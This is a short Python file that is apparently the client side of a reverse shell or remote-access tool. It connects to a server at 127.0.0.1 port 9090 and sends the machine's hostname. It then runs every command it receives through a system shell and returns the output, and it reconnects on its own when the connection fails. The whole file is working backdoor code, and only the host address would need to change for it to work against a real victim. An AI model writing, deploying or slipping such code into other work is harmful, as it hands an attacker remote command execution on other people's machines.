import socket
import sys
import time
import os
import subprocess

class Client(object):

    def __init__(self):
        self.host = '127.0.0.1'
        self.port = 9090
        self.socket = None

    def start_client(self):
        try:
            self.socket = socket.socket()
            self.socket.connect((self.host, self.port))
            hostname = socket.gethostname()
            self.socket.send(hostname.encode())
            self.recv_commands()
        except socket.error as e:
            print("[-] Socket creation failed " + str(e))
            time.sleep(5)
            self.start_client()
    
    def recv_commands(self):
        while True:
            raw = self.socket.recv(1024)
            cmd = raw.decode('utf-8')
            print('[+] Client: received command ' + cmd)
            if cmd == 'quit':
                break
            if cmd == 'join':
                cwd = str(os.getcwd()) + '>' + '<END>'
                self.socket.send(cwd.encode())
                continue
            if cmd.startswith('cd '):
                try:
                    os.chdir(cmd[3:].strip())
                    self.socket.send((str(os.getcwd()) + '>' + '<END>').encode())
                except FileNotFoundError as e:
                    self.socket.send((str(e) + '<END>').encode())
                continue
            sp = subprocess.Popen(
                cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = sp.stdout.read() + sp.stderr.read()
            output_str = str(output_bytes, "utf-8")
            self.socket.send(str.encode(output_str + str(os.getcwd()) + '>\n' + '<END>'))
            print(output_str)

        self.socket.close()


def main():
    client = Client()
    client.start_client()

main()